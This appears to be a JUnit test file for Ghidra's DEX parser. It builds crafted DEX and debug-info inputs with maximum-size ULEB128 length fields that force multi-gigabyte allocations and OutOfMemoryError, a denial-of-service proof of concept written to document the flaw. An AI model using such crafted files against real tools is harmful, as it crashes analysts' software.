package ghidra.file.formats.android.dex.format;

import static org.junit.Assert.*;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

import org.junit.Test;

import ghidra.app.util.bin.BinaryReader;
import ghidra.app.util.bin.ByteArrayProvider;

public class DexAllocationDosTest {

	// ULEB128 encoding of 0x7FFFFFFF (Integer.MAX_VALUE): the largest value
	// LEB128Info.asUInt32() will accept.
	private static final byte[] ULEB128_INT_MAX =
		{ (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, 0x07 };

	// Minimal, otherwise-valid 122-byte DEX file: a real 0x70-byte header
	// with one string_ids entry pointing at a single crafted
	// string_data_item (huge utf16_size ULEB128 + one null terminator byte).
	// Every other table is empty (size 0).
	private static byte[] buildMinimalDexWithMaliciousString() {
		int headerSize = 0x70;
		int stringIdsOffset = headerSize;
		int stringDataOffset = stringIdsOffset + 4;

		ByteBuffer buf = ByteBuffer.allocate(stringDataOffset + ULEB128_INT_MAX.length + 1)
				.order(ByteOrder.LITTLE_ENDIAN);
		buf.put("dex\n".getBytes());
		buf.put("035\0".getBytes());
		buf.putInt(0);              // checksum
		buf.put(new byte[20]);      // signature
		buf.putInt(0);               // fileSize
		buf.putInt(headerSize);      // headerSize
		buf.putInt(0);               // endianTag
		buf.putInt(0);               // linkSize
		buf.putInt(0);               // linkOffset
		buf.putInt(0);               // mapOffset (0 -> parse() skips MapList)
		buf.putInt(1);               // stringIdsSize
		buf.putInt(stringIdsOffset); // stringIdsOffset
		buf.putInt(0);               // typeIdsSize / typeIdsOffset
		buf.putInt(0);
		buf.putInt(0);               // protoIdsSize / protoIdsOffset
		buf.putInt(0);
		buf.putInt(0);               // fieldIdsSize / fieldIdsOffset
		buf.putInt(0);
		buf.putInt(0);               // methodIdsSize / methodIdsOffset
		buf.putInt(0);
		buf.putInt(0);               // classDefsIdsSize / classDefsIdsOffset
		buf.putInt(0);
		buf.putInt(0);               // dataSize / dataOffset
		buf.putInt(0);

		buf.putInt(stringDataOffset); // string_ids[0].stringDataOffset
		buf.put(ULEB128_INT_MAX);     // string_data_item.utf16_size = Integer.MAX_VALUE
		buf.put((byte) 0x00);         // MUTF-8 null terminator

		return buf.array();
	}

	@Test
	public void testMaliciousDexStringTableTriggersHugeAllocationOnOrdinaryImport()
			throws IOException {
		byte[] dex = buildMinimalDexWithMaliciousString();
		BinaryReader reader = new BinaryReader(new ByteArrayProvider(dex), true);

		DexHeader header = new DexHeader(reader); // succeeds: header is well-formed
		try {
			header.parse(reader); // the real per-file driver Ghidra's DEX loader calls
			fail("expected an attempted allocation of ~4GB (Integer.MAX_VALUE chars) to fail");
		}
		catch (OutOfMemoryError e) {
			// Confirmed: attempts `new char[0x7FFFFFFF]` (~4GB) inside
			// StringDataItem. Error, not Exception, so it is not caught by
			// StringIDItem's `catch (Exception e)` fallback.
		}
	}

	@Test
	public void testDebugInfoItemHugeParametersSizeTriggersHugeAllocation() throws IOException {
		ByteBuffer buf = ByteBuffer.allocate(ULEB128_INT_MAX.length * 2);
		buf.put(ULEB128_INT_MAX); // line_start
		buf.put(ULEB128_INT_MAX); // parameters_size = Integer.MAX_VALUE
		BinaryReader reader = new BinaryReader(new ByteArrayProvider(buf.array()), true);

		try {
			new DebugInfoItem(reader);
			fail("expected an attempted allocation of two ~8.6GB int[] arrays to fail");
		}
		catch (OutOfMemoryError e) {
			// Confirmed. CodeItem's caller has no catch at all around
			// `new DebugInfoItem(reader)` (only a `finally` to restore the
			// reader position), so this propagates even further.
		}
	}
}